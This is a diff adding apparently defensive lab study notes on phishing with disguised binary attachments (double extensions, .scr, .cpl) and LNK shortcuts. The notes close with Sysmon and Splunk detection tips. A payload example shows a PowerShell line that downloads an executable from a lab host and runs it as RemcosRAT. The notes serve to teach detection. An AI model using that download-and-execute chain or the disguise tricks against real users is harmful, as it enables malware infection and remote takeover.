@@ -110,3 +110,76 @@ Log file: `RDP-Security.evtx` (Security log)
 - Splunk starting point (field names may differ in your data):
 
         index=windowslogs EventID=4625 LogonType IN (3, 10) | stats count by IpAddress, TargetUserName | sort - count
+
+---
+
+# Phishing: Malicious Binaries and LNK Attachments
+
+Phishing can't be blocked like RDP: if users have Internet access, they eventually bring malware in, bypassing the firewall entirely.
+
+## Current State
+
+- Phishing up **41x** since ChatGPT's 2022 release, per the [HoxHunt Phishing Trends Report 2025](https://hoxhunt.com/guide/phishing-trends-report)
+- Success rates stay high, so users still fall for it
+- Two techniques covered: malicious binaries and LNK attachments
+
+## Technique 1: Binary Attachments
+
+Windows has [many executable extensions](https://github.com/michalzobec/Security-Blocked-File-Extensions-Attachments/blob/main/list-of-blocked-file-extensions.txt). Users know `.exe` is risky but are less careful with these:
+
+| Extension | Why it works |
+|---|---|
+| `.com` | Looks like a domain or meeting link (e.g. `tryhatme.com`) |
+| `.scr` | Screensaver, rarely suspected |
+| `.cpl` | Control Panel item, rarely suspected |
+
+### Hidden Extensions
+
+- Windows hides known file extensions by default, so `program.exe` shows as `program`
+- Attackers abuse this ([MITRE T1036.007](https://attack.mitre.org/techniques/T1036/007/)) with double extensions:
+  - `invoice.pdf.exe`
+  - `cat.png.com`
+- They also change the icon to match the topic, so it looks like a PDF or image
+
+## Technique 2: LNK Attachments
+
+- Attackers avoid AV by sending PowerShell, VBS, or BAT scripts instead of binaries
+- To look trustworthy, the script hides behind an **LNK** shortcut (same type as Desktop shortcuts)
+- Any command can go in the LNK "Target" field, and any icon can be set
+
+### Example Scenario
+
+1. Email from a "local PC store" announces discounts, with `Discounts.zip` attached
+2. ZIP holds a PDF poster (harmless) and a shortcut named `Visit Our Website!.lnk`
+3. The user trusts the PDF, then opens the shortcut
+4. The shortcut runs a PowerShell command instead of opening a website
+
+Verify by right-clicking the LNK → Properties → **Shortcut** tab → Target field.
+
+### Payload Chain: LNK → PowerShell → RemcosRAT
+
+    powershell.exe -c ...
+    # Download the encoded malware
+    (New-object System.Net.WebClient).DownloadFile('https://breacheddomain.thm/FILTERED/r.exe','C:\\ProgramData\\r.exe');
+    # Run the malware (RemcosRAT)
+    start C:\\ProgramData\\r.exe;
+
+| Step | Action |
+|---|---|
+| 1 | LNK launches `powershell.exe -c` |
+| 2 | `WebClient.DownloadFile` fetches `r.exe` from a remote domain |
+| 3 | Saved to `C:\ProgramData\r.exe` (staging directory) |
+| 4 | `start` runs it: RemcosRAT |
+
+- RemcosRAT is used in many attacks on major companies and government agencies
+
+## Detection Tips
+
+- Sysmon Event ID 1: look for `powershell.exe` launched by `explorer.exe` or an archive tool, with a long `-c` or encoded command line
+- Sysmon Event ID 11: new `.exe` in `C:\ProgramData` or other staging paths
+- Sysmon Event ID 3 / 22: the outbound connection and DNS lookup to the download domain
+- Double extensions in filenames (`.pdf.exe`, `.png.com`) are an instant red flag; turn on "show file extensions" on analyst machines (general knowledge)
+- Same chain as the earlier notes: process, then file drop, then network, linked by `ProcessId` and Logon ID
+- Splunk starting point (field names may differ in your data):
+
+        index=windowslogs EventID=1 Image="*\\powershell.exe" ParentImage="*\\explorer.exe" | table _time CommandLine ParentImage User
